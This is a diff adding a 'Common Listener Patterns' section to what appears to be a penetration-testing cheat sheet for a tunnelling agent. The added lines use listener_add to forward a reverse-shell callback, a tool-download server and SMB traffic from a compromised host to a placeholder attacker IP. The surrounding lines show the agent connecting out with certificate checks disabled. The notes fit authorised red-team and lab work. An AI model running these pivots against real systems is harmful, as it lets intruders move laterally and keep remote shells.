@@ -46,6 +46,19 @@ cmd.exe /c start /b .\agent.exe -connect 172.16.1.100:7777 -ignore-cert
 listener_add --addr 172.16.2.5:8888 --to 10.10.14.3:8080 --tcp
 ```
 
+#### Common Listener Patterns
+
+```bash
+# Forward tool download server (python http.server on attacker)
+listener_add --addr 0.0.0.0:8000 --to <attacker_ip>:8000 --tcp
+
+# Forward reverse shell callback
+listener_add --addr <agent_ip>:8888 --to <attacker_ip>:8888 --tcp
+
+# Forward SMB for smbserver
+listener_add --addr <agent_ip>:445 --to <attacker_ip>:445 --tcp
+```
+
 ### Add Additional route
 
 * Certain situations call for an additional route.
